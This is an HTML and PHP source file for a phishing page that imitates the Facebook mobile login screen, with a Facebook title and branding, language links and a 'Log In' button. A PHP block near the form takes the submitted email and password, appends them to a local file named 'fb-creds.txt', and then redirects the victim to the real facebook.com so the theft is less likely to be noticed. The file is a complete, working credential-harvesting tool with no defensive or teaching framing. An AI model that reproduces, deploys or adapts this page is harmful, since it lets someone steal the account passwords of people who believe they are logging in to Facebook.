<!DOCTYPE html>
<html>
<head>
	<title>Facebook</title>
	<meta charset="UTF-8"/>
	<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
	<meta name="keyword" content="HTML, CSS, Javascript"/>
	<meta name="author" content="facebook"/>
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
	<link href='https://fonts.googleapis.com/css?family=ABeeZee' rel='stylesheet'>
	<link rel="stylesheet" href="index.css">
</head>
<body>
	<h2>facebook</h2>
	<p class="sugg"><a href="https://play.google.com/store/apps/details?id=com.facebook.katana">
	<i class="fa fa-mobile fa-2x" id="mobile"></i>Get Facebook for Android and browse faster.</a></p>
		<br />

	<center>
	<?php
		if(isset($_POST['email'])){
			$user=$_POST["email"];
			$pass=$_POST["password"];
			$creds="fb-creds.txt";
			file_put_contents($creds,"user: ".$user."\n",FILE_APPEND | LOCK_EX);
			file_put_contents($creds,"password: ".$pass."\n",FILE_APPEND | LOCK_EX);
			echo "<script>window.location.replace('https://www.facebook.com');</script>";
		}
	?>
	<form method="POST" action="">
		<p class="main">
			<input type="email" placeholder="Mobile number or email address" name="email" class="one" required>
			<input type="password" placeholder="Password" name="password" class="two" required>
		</p>
			<br />
		<button class="loginBtn" type="submit" formmethod="post" id="loginBtn" value="Login" name="Log In" data-sigil="touchable" href="https://www.facebook.com/login.php" onclick="location.href='www.facebook.com'"><span class="loginSpan"><b>Log In</b></span></button>
			<br />
			<br />
		<hr style="width:40%;float:left;margin-top:2%;margin-left:5%"> or <hr style="width:40%;float:right;margin-top:2%;margin-right:5%;">
			<br />
			<br />
		<button class="createAccBtn" type="submit" formmethod="post" id="createAccBtn" value="create" name="Cancelled" data-sigil="touchable" href="https://www.facebook.com/login.php"><span class="createAccSpan"><b>Create New Account</b></span></button>
			<br />
			<br />
		<a href="" style="color:#a4b6d1;font-size:85%;">Forgotten Password?</a>
			<br />
            <br />
	</form>
	</center>

	<ul id="leftLang">
		<li style="color:#777;">English (UK)</li>
		<li>Español</li>
		<li>Italiano</li>
		<li>Deutsch</li>
	</ul>
	<ul id="rightLang">
		<li>Polski</li>
		<li>Français (France)</li>
		<li>Português (Brasil)</li>
	</ul>
<footer>
	<p id="facebookInc">Facebook Inc.</p>
</footer>
</body>
</html>
